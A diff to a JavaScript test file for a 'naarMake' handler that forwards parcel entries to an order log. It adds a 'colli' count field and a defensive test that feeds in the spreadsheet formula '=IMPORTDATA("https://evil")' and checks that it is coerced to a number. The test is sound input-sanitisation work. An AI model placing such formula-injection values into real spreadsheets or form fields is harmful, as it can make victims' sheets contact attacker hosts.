@@ -67,9 +67,9 @@ describe('naar-make', () => {
     const rest = {
       submission_id: CODE,
       entries: [
-        { entry_number: 1, recipient: 'Jansen', shelf: 'Schap 3', photos: [{ filename: 'a.jpg', base64: 'data:image/jpeg;base64,AA' }] },
-        { entry_number: 2, recipient: 'Zonder', shelf: 'Schap 4', photos: [] },
-        { entry_number: 3, recipient: 'Piet', shelf: 'Overig: x', photos: [{ filename: 'b.jpg', base64: 'data:image/jpeg;base64,BB' }] },
+        { entry_number: 1, colli: 1, recipient: 'Jansen', shelf: 'Schap 3', photos: [{ filename: 'a.jpg', base64: 'data:image/jpeg;base64,AA' }] },
+        { entry_number: 2, colli: 2, recipient: 'Zonder', shelf: 'Schap 4', photos: [] },
+        { entry_number: 3, colli: 1, recipient: 'Piet', shelf: 'Overig: x', photos: [{ filename: 'b.jpg', base64: 'data:image/jpeg;base64,BB' }] },
       ],
     }
     const res = await naarMake(post(JSON.stringify({ ...rest, labels })))
@@ -102,6 +102,12 @@ describe('naar-make', () => {
     expect(d.print_url).toBe(`https://app.example/?s=${CODE}`)
     expect(d.fotos_url).toBe(`https://app.example/?fotos=${CODE}`)
     expect(JSON.stringify(d)).not.toContain('evil')
+  })
+
+  it('maakt van colli altijd een getal (gaat ongeformatteerd het orderlog in)', async () => {
+    const entries = [{ entry_number: 1, colli: '=IMPORTDATA("https://evil")' }, { entry_number: 2, colli: 3 }]
+    expect((await naarMake(post(payload({ entries })))).status).toBe(200)
+    expect(doorgestuurdBody().entries.map((e: { colli: unknown }) => e.colli)).toEqual([1, 3])
   })
 
   it('neemt de origin van de request voor de links', async () => {
